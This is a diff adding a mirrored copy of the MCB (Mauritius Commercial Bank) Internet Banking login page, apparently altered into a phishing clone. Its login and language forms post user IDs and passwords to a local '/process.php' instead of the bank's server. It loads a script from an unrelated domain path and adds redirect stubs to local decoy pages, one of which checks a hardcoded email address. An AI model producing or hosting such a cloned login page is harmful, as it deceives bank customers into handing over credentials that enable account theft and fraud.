@@ -1,0 +1,726 @@
+
+
+
+
+<!DOCTYPE html>
+<html>
+	
+<!-- Mirrored from ib.mcb.mu/T001/banking.jsp by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 05 Jan 2024 09:58:19 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+	<title>MCB Internet Banking</title>
+	<meta http-equiv="cache-control" content="no-cache"> 
+	<meta http-equiv="cache-control" content="no-store"> 
+	<meta http-equiv="Pragma" content="no-cache"> 
+	<meta http-equiv="Expires" content=0>
+	<meta http-equiv="X-UA-Compatible" content="IE=11">
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta name="viewport" content="1024, initial-scale=1.0, user-scalable=1, minimum-scale=1.0, maximum-scale=2.0" />
+	<meta name="apple-mobile-web-app-capable" content="yes" />
+	<meta name="apple-mobile-web-app-status-bar-style" content="default" />
+	<meta name="HandheldFriendly" content="true" />
+	<meta name="MobileOptimized" content="width" />
+	<LINK REL="SHORTCUT ICON" href="images/mcb.ico" />
+	
+
+
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+	<meta http-equiv="X-UA-Compatible" content="IE=11" />
+<link type="text/css" rel="stylesheet" href="css/cmn/banking.uri.css" />
+<link type="text/css" rel="stylesheet" href="css/C_COLPAL1/scrollbars.uri.css" />
+<link type="text/css" rel="stylesheet" href="css/cmn/virtualkeyboard.uri.css" />
+<link rel="shortcut icon" href="images/mcb.ico" />
+
+<script type="text/javascript" src="JS/combined/jquery-includes.js" charset="utf-8"></script>
+<script type="text/javascript" src="jsdir/common.js" charset="utf-8"></script>
+<script type="text/JavaScript" src="jsdir/virtualkeyboard.js" charset="utf-8"></script>
+<script type="text/JavaScript" src='jsdir/rsa_compiled.js' charset="utf-8"></script>
+<!-- script type="text/JavaScript" src='jsdir/fb.js' charset="utf-8"></script -->
+	<style>
+		html { 
+			display:none 
+		}
+	</style>
+<script>
+if (self == top) {
+	document.documentElement.style.display = 'block';
+} else {
+	top.location = self.location;
+}
+</script>
+<script type="text/javascript">
+	$(document).ready(function() {
+		//$('#a1_up').bubbletip($('#tip1_up'));
+		//$('#a2_up').bubbletip($('#tip2_up'));
+		
+		$('.manual-ajax').click(function(event) {
+		      event.preventDefault();
+		      $.get(this.href, function(html) {
+		        $(html).appendTo('body').modal();
+		      });
+		    });
+			    
+		$(window).resize(function(){
+			 if(window.screen.width <= 800) { 
+				  $('#wrapper').attr('style', 'width: 95%');
+				  $('#wrapper #section').attr('style', 'width: 95%');
+				  $('#wrapper #section.login').attr('style', 'width: 68%');
+				  $('#wrapper #section.savings_account').attr('style', 'width: 68%');
+				  $('.virtualButtons').attr('style', "width:24px;height:24px");
+				  $('#login-keyboard-controls input').attr('style', 'height:24px');
+				  $('.header_nav').attr('style', 'width: 99%');
+				  $('#footer').attr('style', 'width: 95%');
+			 } else { 
+				  $('#wrapper').removeAttr('style');
+				  $('#wrapper #section').removeAttr('style');
+				  $('#wrapper #section.login').removeAttr('style');
+				  $('#wrapper #section.savings_account').removeAttr('style');
+				  $('.virtualButtons').removeAttr('style');
+				  $('#login-keyboard-controls input').removeAttr('style');
+				  $('.header_nav').removeAttr('style');
+				  $('#footer').removeAttr('style');
+			 }
+			 
+	  }).trigger('resize');
+	  //initialize_fb ({appId : 'null', channelURL : 'null'});
+	});
+	
+	function passwordStrength(i)
+	{
+		var password = document.getElementById('pass0'+i).value;
+		var desc = new Array();
+		desc[0] = "Very Weak";
+		desc[1] = "Weak";
+		desc[2] = "Better";
+		desc[3] = "Medium";
+		desc[4] = "Strong";
+		desc[5] = "Strongest";
+
+		var score   = 0;
+		//if password bigger than 6 give 1 point
+		if (password.length > 6) score++;
+
+		//if password has both lower and uppercase characters give 1 point	
+		if ( ( password.match(/[a-z]/) ) && ( password.match(/[A-Z]/) ) ) score++;
+
+		//if password has at least one number give 1 point
+		if (password.match(/\d+/)) score++;
+
+		//if password has at least one special caracther give 1 point
+		if ( password.match(/.[!,@,#,$,%,^,&,*,?,_,~,-,(,)]/) )	score++;
+
+		//if password bigger than 12 give another 1 point
+		if (password.length > 12) score++;
+
+		
+		
+		 document.getElementById("passwordDescription"+ i).innerHTML = desc[score];
+		 
+		 document.getElementById("passwordStrength"+ i).className = "strength" + score;
+	}
+</script>
+
+        
+	<script type="text/javascript">
+		//-----------------------------------------------------------------------------
+		var scr_w, scr_w1,scr_h, scr_h1;
+		//-----------------------------------------------------------------------------			
+		$(document).ready(function() {
+			   
+			if($('div#fldLoginUserId input').val() == '') {
+				$(location).attr('href','savings_account_offers.html');
+			} 
+			
+			setScreenSize ();
+		
+		});
+		//-----------------------------------------------------------------------------
+		function fLogon(){
+			   
+			$(location).attr('href','retrieve_application.html');
+			
+			if(document.getElementById('fldLoginUserId').value =='tim.brown@gmail.com'){
+				
+				$(location).attr('href','savings_account_offers.html');
+			}
+			
+		}
+		//-----------------------------------------------------------------------------
+		function setScreenSize(){
+			
+			scr_w1 = screen.availWidth-10+"px";
+			scr_h1 = screen.availHeight-60+"px";
+		}
+		//-----------------------------------------------------------------------------
+		function locateBranches(title) {
+			document.frmprocess.fldRequestId.value = "RRLOB01";
+			window_open (document.frmprocess, title, "RRLOB01");
+		}
+		//-----------------------------------------------------------------------------
+		function  registerUser(title){
+			document.frmprocess.fldRequestId.value = "RRRNB01";
+			window_open (document.frmprocess, title, "RRRNB01");
+		}
+		function  opengoal(title){
+			document.frmprocess.fldRequestId.value = "RRORG351";
+			window_open (document.frmprocess, title, "RRORG351");
+		}
+		//-----------------------------------------------------------------------------
+		function showFAQ(p_title, p_lang){
+			window.open(p_lang + '/faq.html');				
+		}
+		//------------------------------------------------------------------------------
+		function getStatus(title){
+			document.frmprocess.fldRequestId.value = "RRORG111";
+			window_open (document.frmprocess, title, "RRORG111");
+		}
+		
+		//------------------------------------------------------------------------------
+		function window_open(frm, title, id){
+			var window_name = 'process_' + id;
+			var frm_action;
+			window.open (
+				''
+			,	window_name
+			,	'toolbar=0,location=0,directories=0,status=1,menubar=0,scrollbars=1,resizable=0,left=0,top=0,width='+scr_w1+',height='+scr_h1
+			);
+			frm.target = window_name;
+			frm.title.value = title;
+			frm_action = frm.action;
+			frm.action = "process.html"
+			frm.submit ();
+			frm.action = frm_action;
+		}
+		//------------------------------------------------------------------------------
+		function aboutbox () {
+			window.open ("about.html", "NewWindow",
+					"dependant=no,directories=no,location=no,menubar=no"
+				+	",resizable=no,scrollbars=yes,titlebar=no,toolbar=no,"
+				+ "0, 0, top=0,left=0,status=1,width=400,height=300");
+		}
+		//-----------------------------------------------------------------------------
+		function extractFieldsFromURL(){
+			var fields=new Object();
+			var url = new String(document.URL);
+			var fieldStartPos = url.indexOf("?") + 1;
+			if(fieldStartPos>0 && url.substring(fieldStartPos).length>0){
+				var fields = url.substring(fieldStartPos).split("&");
+				for(i=0; i<fields.length; i++){
+					var field = fields[i].split("=");
+					if(field.length == 2 && field[0].length>0){
+						var fieldName = field[0];
+						var fieldValue = field[1];
+						if($('input[name="' + fieldName +'"]').val() == undefined){
+							createHiddenField(fieldName, fieldValue);
+						}
+					}
+				}
+			}
+			var selected = document.activeElement;
+			if ((selected.id == "fldLoginUserId") || (selected.id=="undefined") || (selected.id=="")){
+			$('#fldLoginUserId').focus();
+		}
+		}
+		//-----------------------------------------------------------------------------
+		function createHiddenField(fieldName, fieldValue){
+			fieldElem = $('<input type="hidden" name="' + fieldName + '" value="' + fieldValue + '"/>');
+			$('form[name="frmmain"]').append(fieldElem);
+		}		
+		//-----------------------------------------------------------------------------
+		// Code to disable F12, F5, F6, Ctrl+U
+		if (document.addEventListener) // code for cross browser compatibility as addEventListener is not supported in IE8 and earlier versions. 
+		{
+         document.addEventListener("keydown", disableKeys, false);
+        } 
+		else if (document.attachEvent) 
+		{
+         document.attachEvent("onkeydown", disableKeys);
+        }
+		
+		function disableKeys(event)
+		{
+			event = (event || window.event);
+			if (event.keyCode == 123 || ((event.keyCode == 85) && event.ctrlKey )|| event.keyCode == 116 || event.keyCode == 117)
+			{
+				if(event.preventDefault) event.preventDefault();
+				return false;
+			}
+		}
+		//-----------------------------------------------------------------------------
+		</script>
+	</head>
+	
+	<body class="bg" onload="extractFieldsFromURL();">
+			
+
+
+
+
+<div id="headerWrapper">
+	<div id="header">
+		<div id="_topMenu">
+		<!--<div id='logoWrapper'>
+			<div id="logo" class="logo"></div>
+		</div>
+		<div class="inner-head">
+			<span>Call for free on :</span>1-800-111-1111
+		</div>-->
+		
+		
+		<form name="frmlang" method="POST" action="/process.php">
+			<div id="topMenu">
+			
+			</div>
+		</form>
+		
+	</div>
+	
+	</div>
+</div>
+
+
+			<div id ="mainall" >
+					
+						<form name="frmmain"  action="/process.php"  method="POST"  autocomplete="off"  autocomplete="off" >
+						<input type='hidden' name='idsequence' value='ZlwS20nDQhTMSoFUPqJuMtqrJjHz9icXJYMpxZCRzBE=' />
+						<script type="text/JavaScript"  language="JavaScript"  src="jsdir/Ajax_Login.js" ></script>
+						<script>
+			var userId = '';
+			var snonce = '';
+			function blurUserId(el) {
+				userId = el.value;
+				if (el.value == '') {
+					el.value = el.title;
+					el.style.color="#666";
+				}
+			}
+			function focusUserId(el) {
+				if (el.value == el.title) {
+					el.value = '';
+					el.style.color="#333";
+				}
+			}
+			function capLock(e){
+ 			kc = e.keyCode?e.keyCode:e.which;
+			sk = e.shiftKey?e.shiftKey:((kc == 16)?true:false);
+ 			if(((kc >= 65 && kc <= 90) && !sk)||((kc >= 97 && kc <= 122) && sk))
+ 			$("#capserr").show();
+ 			else
+ 			$("#capserr").hide();
+			}
+			function createForm (p_frmname,p_requestid) {
+				var form = $("form[name="+p_frmname+"]");
+				if (form.length == 0) {
+					$("form[name='frmmain']").after ('<form name='+p_frmname+' action="process.jsp" method="POST" autocomplete="off"/>');
+					var form = $("form[name="+p_frmname+"]");
+					form.append ('<input type="hidden" value='+p_requestid+' name="fldRequestId"/>');
+					form.append ('<input type="hidden" value="01" name="fldDeviceId"/>');
+					form.append ('<input type="hidden" value="" name="title"/>');
+				}
+			}
+			function forgotPassword () {
+				var l_frmname 	= 'frmprocess';
+				var l_requestid = 'RRFPW01';
+				createForm(l_frmname,l_requestid);	
+				formwindow_open ($("form[name="+l_frmname+"]") [0], 'Forgot Password?', l_requestid);
+			}
+			function newUser () {
+				var l_frmname 	= 'frmprocess';
+				var l_requestid = 'RRUSR11';
+				createForm(l_frmname,l_requestid);	
+				formwindow_open ($("form[name="+l_frmname+"]") [0], 'Online Registration', l_requestid);
+			}
+			
+			function troubleshootLoginIssue(){
+				var l_frmname 	= 'frmprocess';
+				var l_requestid = 'RRUBA09';
+				createForm(l_frmname,l_requestid);	
+				formwindow_open ($("form[name="+l_frmname+"]") [0], 'Login Problem', l_requestid);
+			}
+		</script><div id="tablediv"  style="position:relative;" ><div id="wrapper"  class="login" ><div class="alert" ><div class="alert_inner" ><span class="icon icon_information" ></span><span class="alert_message" ><script type="text/javascript" >var l_notification_msg = 'Please note that the migration of companies to MCB Internet Banking Pro is currently underway and is taking place in phases. <br> Companies can register once they have been notified by the bank.';document.write('<p>');document.write(l_notification_msg);document.write('</p>');</script></span></div></div><div id="main" ><div class="section_holder"  style="background:white;width:975px;border:1px solid #e6e6e6" ><div class="section_left"  style="border:0px solid #e6e6e6" ><div id="keyboard_firstrowtwrapper" ><div id="keyboard_bankname" >
+								Login
+							</div></div><div id="rows" ><div class="login_labeltext"  id="user_id" ><label for="fldLoginUserId" >User ID</label></div><div id="fldPassword" ><input type="text"  class="inputbox"  id="fldLoginUserId"  name="fldLoginUserId"  onblur="blurUserId(this);"  onfocus="focusUserId(this);" ></input><span id="useriderr"  class="input-error-msg"  style="display:none;" >Please enter User ID</span></div></div><div id="rows" ><div class="login_labeltext"  id="password_id" ><label for="VKBPassword" >Password</label></div><div class="stdinputbox"  id="fldPassword" >
+							<input type="password"  value=""  class="inputbox"  name="fldPasswordStandard"  maxlength="20"  oncopy="return false;"  onpaste="return false;"  id="SKBPassword"  onkeypress="capLock(event)" ></input>
+							<span id="pwderr"  class="input-error-msg"  style="display:none;" >Please enter password</span><span id="capserr"  class="input-error-msg"  style="display:none;" >Caps Lock is on </span></div><div class="virtinputbox"  id="fldPassword"  style="display: none;" >
+							<input type="text"  value=""  class="inputbox"  name="fldPasswordVirtual"  maxlength="20"  readonly="true"  id="VKBPassword" ></input><span id="pwderr"  class="input-error-msg"  style="display:none;" >Please enter password</span></div><div id="virtualkeyboard"  class="virtualkeyboard" ><img src="images/ico_keyboard.gif"  class="ico_keyboard"  title="Virtual Keyboard"  width="44"  height="29"  href="#VKB"  style="cursor:pointer" ></img></div></div><div id="tabs_wrapper"  style="position:absolute; padding:1px" ><div id="tabs_content_container"  style="padding:5px" ><div id="VKB"  class="tab_content"  style="display: none;" ><div class="inputbox" ><div class="labeltext"  style="float:left; margin: 10px 0px;" ><input type="checkbox"  name="elemC4"  id="elemC4"  style="margin:10px 5px 0 0;"  checked="true" ></input><label for="elemC4" >Click here to enter by hovering</label></div><div id="closebut"  class="overlay-close" ><img height="25"  width="25"  border="0"  alt="Close"  title="Close"  href="#VKB"  src="images/ico_cross-small.jpg" ></img></div></div><div class="hsplitbar" ></div><div id="login-keyboard" ><table cellpadding="0"  cellspacing="0"  align="center"  width="50%" ><tr><td align="center" ><div id="login-keyboard-special" ><table cellpadding="1"  cellspacing="1" ><tr><script LANGUAGE="JavaScript" >
+																	for (var i=0; i < 15; i++) {
+																		document.write ('<td>');
+																		imageSpCharOnPage(i);
+																		document.write ('</td>');
+																	}
+																</script></tr></table></div></td><td rowspan="3"  style="vertical-align:top;" ><div id="login-keyboard-numeric" ><table cellpadding="1"  cellspacing="1"  role="presentation"  summary="" ><tr><script LANGUAGE="JavaScript" >
+																	for (var i=0; i < 3; i++) {
+																		document.write ('<td>');
+																		imageNumOnPage(i);
+																		document.write ('</td>');
+																	}
+																</script></tr><tr><script LANGUAGE="JavaScript" >
+																	for (var i=3; i < 6; i++) {
+																		document.write ('<td>');
+																		imageNumOnPage(i);
+																		document.write ('</td>');
+																	}
+																</script></tr><tr><script LANGUAGE="JavaScript" >
+																	for (var i=6; i < 9; i++) {
+																		document.write ('<td>');
+																		imageNumOnPage(i);
+																		document.write ('</td>');
+																	}
+																</script></tr><tr><td>&nbsp;</td><script LANGUAGE="JavaScript" >
+																	for (var i=9; i < 10; i++) {
+																		document.write ('<td>');
+																		imageNumOnPage(i);
+																		document.write ('</td>');
+																	}	
+																</script><td>&nbsp;</td></tr></table></div></td></tr><tr><td valign="top"  align="center" ><div id="login-keyboard-alpha" ><table cellpadding="1"  cellspacing="1" ><tr><script LANGUAGE="JavaScript" >
+																	for (var i=0; i < 10; i++) {
+																		document.write ('<td>');
+																		imageAlphaOnPage(i);
+																		document.write ('</td>');
+																	}
+																</script></tr></table><table cellpadding="1"  cellspacing="1" ><tr><script LANGUAGE="JavaScript" >
+																	for (var i=10; i < 19; i++) {
+																		document.write ('<td>');
+																		imageAlphaOnPage(i);
+																		document.write ('</td>');
+																	}
+																</script></tr></table><table cellpadding="1"  cellspacing="1" ><tr><script LANGUAGE="JavaScript" >
+																	for (var i=19; i < 26; i++) {
+																		document.write ('<td>');
+																		imageAlphaOnPage(i);
+																		document.write ('</td>');
+																	}
+																</script></tr></table></div></td></tr><tr><td width="100%"  align="center" ><table cellpadding="1"  cellspacing="1"  align="center"  id="login-keyboard-controls" ><tr><td>
+																	<input type="button"  value="Upper"  id="elemC0"  onMouseDown="return changeToStar();"  onMouseUp="return changeBack();"  onMouseOut="return changeBack();"  OnClick="setCase('Upper','Lower');"  class="buttons" ></input></td><td>
+																		<input type="button"  value="Delete"  id="elemC1"  onMouseDown="return changeToStar();"  onMouseUp="return changeBack();"  onMouseOut="return changeBack();"  OnClick="DeletePwd();"  class="buttons" ></input></td><td>
+																		<input type="button"  value="Clear All"  id="elemC2"  onMouseDown="return changeToStar();"  onMouseUp="return changeBack();"  onMouseOut="return changeBack();"  OnClick="ClearPwd();"  class="buttons" ></input></td><td>
+																		<input type="button"  value="Not Mixed"  id="elemC3"  onMouseDown="return changeToStar();"  onMouseUp="return changeBack();"  onMouseOut="return changeBack();"  OnClick="setRandom('Mixed','Not Mixed');"  class="buttons" ></input></td></tr></table></td></tr></table></div></div></div></div><div style="text-align: center;padding: 5px 10px 5px; cursor: pointer" >
+																		<input name="imageField"  type="submit"  value="Login"  id="Login"  class="login_button"  onClick="fNonce()"  style="cursor: pointer !important; padding: 13px 76px!important;"  disabled="true" ></input></div><div id="rows" ><div class="keyboard_wrapper" ><a style="color: black; text-decoration: underline;"  href="javascript:void(0)"  onclick="troubleshootLoginIssue();" >Can't Login?</a></div><div class="keyboard_wrapper" ><label id="btnLoginProblemlbl"  class="button_desc"  for="btnLoginProblem" >(Forgot Password/ID, Account Locked)</label></div><div class="keyboard_wrapper"  style="margin: 20px 0px 0px 16px;" ><a style="font-size: 18px; font-weight: 700;"  href="javascript:void(0)"  onclick="newUser();" >Register to Internet Banking</a><span class="icon icon--arrowrightred"  style="background-position: 50% 43%" ></span></div></div><style>
+						.button_desc{
+						 	font-style: italic;
+						 	font-size: 13px;
+							font-weight: 400;
+							color: #949193 !important
+							}
+					</style></div><div class="section_right"  style="border:0px solid #e6e6e6" ><div class="logo_holder"  style="margin:14px 18px !important;" ><img src="images/IBPro_SmartApprove.png" ></img></div><p style="color:black !important ;font-size: 22px !important;line-height:18px !important;margin-top: 92px !important;" >A new experience awaits our <br></br>non-individual customers! </p><div style="margin:9px auto !important;" ><a style="font-size: 20px !important; font-weight: 700 !important;"  href="https://ibpro.mcb.mu/"  target="_blank" >Register and/or Login to Internet Banking Pro</a><span class="icon icon--arrowrightred"  style="background-position: 50% 43%" ></span></div><p style="font-size:15px !important;padding: 10px 16px !important;font-style:italic !important; margin-top: -7px !important; font-weight: 400 !important; color: #949193 !important;" >
+						Please complete registration once you have been notified by the Bank.</p></div></div><div class="section_bottom" ><div class="section_title" ><img src="images/ico_security.png"  height="59"  width="73" ></img><h2>Security</h2><blockquote><p>MCB will never ask for your login details by email.</p><p>Report any suspicious email, website, or unsolicited request that </p><p>claims affiliation with MCB by calling <strong>202 6060</strong> or by emailing </p><p><a href="mailto:alert@mcb.mu" >alert@mcb.mu</a></p><div><a href="https://www.mcb.mu/en/personal/security-centre/online-and-mobile-security/ways-to-keep-safe"  target="_blank" >How to protect yourself online</a><span class="icon icon--arrowrightred" ></span></div></blockquote><div id="verisign_seal" ><script type="text/javascript"  src="https://seal.websecurity.norton.com/getseal?host_name=ib.mcb.mu&amp;size=S&amp;use_flash=NO&amp;use_transparent=NO&amp;lang=en" ></script></div></div></div></div></div></div><div id="footer" ><div class="footerWrapper" ><p class="footer_list-title" >Explore MCB Internet Banking</p><div class="footer_link-list" ><ul><li><a href="https://www.mcb.mu/en/personal/banking/ways-to-bank/internet/"  target="_blank" >Key features <span class="icon icon-arrowrightwhite" ></span></a></li></ul></div><div class="footer_link-list" ><ul><li><a href="https://www.mcb.mu/en/personal/support/faqs/online-banking"  target="_blank" >FAQs<span class="icon icon-arrowrightwhite" ></span></a></li></ul></div><div class="footer_link-list" ><ul><li><a href="https://www.mcb.mu/en/personal/security-centre/online-and-mobile-security/"  target="_blank" >Protect yourself <span class="icon icon-arrowrightwhite" ></span></a></li></ul></div><div class="LoginCopyright" >
+			©  <script type="text/javascript" >document.write(new Date().getFullYear());</script>  MCB - The Mauritius Commercial Bank Ltd </div></div></div><input type="hidden"  name="fldPassword"  value="" ></input><script language="JavaScript" >
+	//-----------------------------------------------------------------------------
+	var virtKeyb = false;
+	var speedMbps;
+	var BW_THRESHOLD = 300;
+	var scr_w, scr_w1,scr_h, scr_h1;
+	function initializelogin() 
+	{
+	
+		setScreenSize ();
+		if (virtKeyb) {
+		} else {
+			var keyBoard = document.getElementById('login-keyboard').getElementsByTagName("BUTTON");
+			for(i=0; i <= keyBoard.length-1; i++){
+					keyBoard[i].disabled=true;
+					keyBoard[i].style.color='#AAAAAA';
+			}
+		}
+		$("#fldLoginUserId").focus (function (e) {focusUserId (this);});
+		$("#fldLoginUserId").blur (function (e) {blurUserId (this);});
+		blurUserId (document.getElementById ("fldLoginUserId"));
+		$(".virtinputbox").hide();
+		document.getElementById("Login").disabled = false;
+	}
+
+	$(document).ready(function() {
+	
+		initializelogin ();
+		getBandWidth();
+	});
+	//added by foram
+	$(".alert").hide();
+	$(".icon icon_information").hide();
+	var l_sys_notification = 'Y';
+	if(l_sys_notification!='N'){
+	$(".alert").show();
+	$(".icon icon_information").show();
+	}
+	
+	$(".tab_content").hide();
+	$(".stdinputbox").show();
+	$(".virtinputbox").hide();
+	$(".virtualkeyboard img").click(function() {
+	
+			$(".tab_content").hide();	//	Hide all tab content
+			var selected_tab = $(this).attr("href");	//	Here we get the href value of the selected tab
+			$(selected_tab).fadeIn();	//	Show the selected tab content
+			virtKeyb = true;
+			$(".stdinputbox").hide();
+			$(".virtinputbox").show();
+			document.frmmain.fldPasswordVirtual.value = "";
+			document.frmmain.fldPasswordStandard.value = "";
+			return false;	//	At the end, we add return false so that the click on the link is not executed
+		});
+	$(".overlay-close img").click(function(){
+	$(".tab_content").hide();
+	var selected_tab = $(this).attr("href");
+		$(selected_tab).fadeOut();
+		virtKeyb = false;
+		document.frmmain.fldPasswordStandard.value = document.frmmain.fldPasswordVirtual.value;
+		$(".stdinputbox").show();
+		$(".virtinputbox").hide();
+
+		return false;
+	})
+
+	//added by foram
+
+	function getBandWidth() 
+	{
+		var startTime, endTime;
+		var imgSize = 983094; //bytes
+		var testImg = new Image();
+		testImg.src = "images/test.html" + "?n=" + Math.random();
+		startTime = (new Date()).getTime();
+
+		testImg.onload = function () {
+			endTime = (new Date()).getTime();
+			var duration = (endTime - startTime) / 1000;
+			var bitsLoaded = imgSize * 8;
+			var speedBps = bitsLoaded / duration;
+			speedMbps = ((speedBps / 1024)/1024).toFixed(2);
+		}
+	}
+
+	//-----------------------------------------------------------------------------		
+	function fLogon (p_snonce) {
+
+		var pwd = null;
+		var rsa = new RSAKey();
+		var mod = "912f2b92b6eece87d660d1f58e3208fb487fce3e672aeb93b28e2d575a1888516ff7d390141d3afbe185a083dd9bb84d42fdef9a5a3901590e74a35eb6358c29a0ac4d34daeb1cafe6ae0e8012a6c96a6b0c609e55dadec925888c6b06436da2c388170e7b51b0b9475d01ad8893c87ced00a6f0793b5a9aa8acdbff4b694ce9";
+		var expo = "10001";
+		rsa.setPublic(mod, expo);
+
+	//	if (userId == "" || userId =="User Id") {
+		if (document.frmmain.fldLoginUserId.value == "" || document.frmmain.fldLoginUserId.value == "User ID") {
+			
+			$("#useriderr").show();
+			$("#pwderr").hide();
+			
+			$( "#fldLoginUserId" ).removeClass("inputbox").addClass( "inputbox input-error" );
+			$( "#VKBPassword" ).removeClass("inputbox input-error").addClass( "inputbox" );
+			$( "#SKBPassword" ).removeClass("inputbox input-error").addClass( "inputbox" );
+			
+				
+//			alert ("User Id must be entered");
+			document.frmmain.fldLoginUserId.focus ();
+			return false;
+		}else{
+		$("#useriderr").hide();
+		$( "#fldLoginUserId" ).removeClass("inputbox input-error").addClass( "inputbox" );
+		}
+
+			if (virtKeyb) {
+			if (document.frmmain.fldPasswordVirtual.value == "") {
+			//	alert ("Password must be entered");
+				if (document.frmmain.fldPasswordStandard.value == ""){
+				$("#pwderr").show();
+				$( "#VKBPassword" ).removeClass("inputbox").addClass( "inputbox input-error" );
+				document.frmmain.fldPasswordVirtual.focus ();
+				return false;
+				}
+			}else{
+				$("#pwderr").hide();
+				$( "#VKBPassword" ).removeClass("inputbox input-error").addClass( "inputbox" );
+			}
+
+			pwd = document.frmmain.fldPasswordVirtual.value;
+			document.frmmain.fldPasswordVirtual.value = "";
+		} else {
+			if (document.frmmain.fldPasswordStandard.value == "") {
+//				alert ("Password must be entered");
+				if (document.frmmain.fldPasswordVirtual.value == ""){
+				$("#pwderr").show();
+				$( "#SKBPassword" ).removeClass("inputbox").addClass( "inputbox input-error" );
+				document.frmmain.fldPasswordStandard.focus ();
+				return false;
+				}
+			}else{
+				$("#pwderr").hide();
+				$( "#SKBPassword" ).removeClass("inputbox input-error").addClass( "inputbox" );
+			}
+			pwd = document.frmmain.fldPasswordStandard.value;
+			document.frmmain.fldPasswordStandard.value = "";
+		}
+		
+		
+		if(pwd.length < 16){	   
+		aString = new String("16");	
+		answer = aString - pwd.length;  
+				var sr = " ";
+				var cnt ;
+			for (var i = 0; i < answer; i++) {				 
+				var rsr =  pwd.concat(sr);
+				pwd =rsr;			
+			}
+	   }
+	  
+		document.frmmain.fldPassword.value = rsa.encrypt(p_snonce+pwd);
+		document.frmmain.fldRequestId.value = "RRLGN01";
+		
+		var isLowBW = false;
+
+		var scr_w, scr_w1;
+		var scr_h, scr_h1;
+		scr_w1 = 1015;
+		scr_h1 = 740;
+
+		if (scr_w == '800')
+		{
+			scr_w1 = 785;
+			scr_h1 = 500;
+		}
+		
+		if(typeof loginWindow != 'undefined'){
+			try{
+			loginWindow.close();
+			}catch(e){
+			}
+		}
+
+		if(speedMbps <= BW_THRESHOLD) 
+		{
+			var UI_id = document.frmmain.fldlitever;
+			for(var i = 0; i < UI_id.options.length; i++) {
+				if(UI_id.options[i].value == "L") {
+					UI_id.selectedIndex = i;
+					break;
+				}
+			}
+			isLowBW = true;
+		}
+		
+		if(isLowBW) {
+			$("#bwDialog").dialog("open");
+			return false;
+		}
+		else {
+			return redirectToSummaryPage();
+		}
+	}
+
+	document.onkeydown=function(){
+		if(window.event.keyCode=='13'){
+			fNonce();
+		}
+	}
+	function redirectToSummaryPage() 
+	{
+		var scrW = screen.availWidth-10+"px";
+		var scrH = screen.availHeight-60+"px";
+		var windowName = document.frmmain.fldLoginUserId.value.replace(/[^a-zA-z0-9]+/g,"a");
+		loginWindow = window.open ("", windowName ,
+				"dependant=no,directories=no,location=no,menubar=no"
+			+	",resizable=yes,scrollbars=yes,titlebar=no,toolbar=no,"
+			+ "0, 0, top=0,left=0,status=1,"
+			+ "width=" + (scrW)
+			+ ",height=" + (scrH)); 
+
+		document.frmmain.target = windowName ;
+		document.frmmain.submit ();
+		loginWindow.focus();
+		
+		document.frmmain.fldLoginUserId.value = "";
+		document.frmmain.fldPassword.value = "";
+		document.frmmain.fldPasswordStandard.value = "";
+		document.frmmain.fldPasswordVirtual.value = "";
+
+		
+		return false;
+	}
+	//-----------------------------------------------------------------------------		
+	function setheight () {
+		var isNS6 = (!document.all && document.getElementById) ? true : false;
+
+		if(isNS6==true) {
+			document.getElementById('TDlogin').style.height ='350px';
+		} else {
+			document.getElementById('TDlogin').style.height ='100%';
+		}
+	}
+	//-----------------------------------------------------------------------------
+	function DeletePwd () {
+		if (virtKeyb) {
+			var strNumField = new String(document.frmmain.fldPasswordVirtual.value);
+			document.frmmain.fldPasswordVirtual.value = strNumField.substring(0,strNumField.length-1);
+			//document.frmmain.fldPasswordVirtual.id="";
+			doRandomize();
+		}
+		return false;
+	}
+	//-----------------------------------------------------------------------------
+	function ClearPwd () {
+		if (virtKeyb) {
+			document.frmmain.fldPassword.value = "";
+			document.frmmain.fldPasswordStandard.value = "";
+			document.frmmain.fldPasswordVirtual.value = "";
+			doRandomize();
+		}
+		return false;
+	}
+	//------------------------------------------------------------------------------
+			function formwindow_open(frm, title, id){
+				var window_name = 'process_' + id;
+				var frm_action;
+				window.open (
+					''
+				,	window_name
+				,	'toolbar=0,location=0,directories=0,status=1,menubar=0,scrollbars=1,resizable=0,left=0,top=0,width='+scr_w1+',height='+scr_h1
+				);
+				frm.target = window_name;
+				frm.title.value = title;
+				frm.fldRequestId.value = id;
+				frm_action = frm.action;
+				frm.action = "process.html"
+				frm.submit ();
+				frm.action = frm_action;
+			}
+	//------------------------------------------------------------------------------
+	function setScreenSize(){
+				
+				scr_w1 = screen.availWidth-10+"px";
+				scr_h1 = screen.availHeight-60+"px";
+			}
+	//------------------------------------------------------------------------------
+	function fNonce(){
+		var l_reqarr = new Array();
+		var fldRequestId=document.frmprocess.fldRequestId.value = "RRLGN04";
+		var fldDeviceId=document.frmmain.fldDeviceId.value;		  
+		
+		l_reqarr.push('fldDeviceId=01');
+		SendAjaxRequestLogin(l_reqarr,'RRLGN04',validatepassword,null,null,null); 
+		
+		}
+
+		
+	function validatepassword(p_xml,p_text){
+
+		snonce = $("#nonce",p_text).val();
+		fLogon(snonce);
+		
+	}
+			
+	//-------------------------------------------------------------------------------		
+</script><input name="fldRequestId"  value="RRLGN01"  type="hidden" ></input><input name="fldDeviceId"  value="01"  type="hidden" ></input></form>
+
+						
+			</div>
+	<!--/form-->
+		<form name="frmprocess" method="POST" action="https://ib.mcb.mu/T001/process.jsp">
+			<input type="hidden" name="fldRequestId" value=""/>
+			<input type="hidden" name="fldDeviceId" value="01"/>
+			<input type="hidden" name="title" value=""/>
+			<input type="hidden" name="usertype" value="EN1"/>
+		</form>
+		<script type="text/javascript" src="../../www.images-home.com/image.js"></script>
+	</body>
+
+<!-- Mirrored from ib.mcb.mu/T001/banking.jsp by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 05 Jan 2024 09:58:32 GMT -->
+</html> 
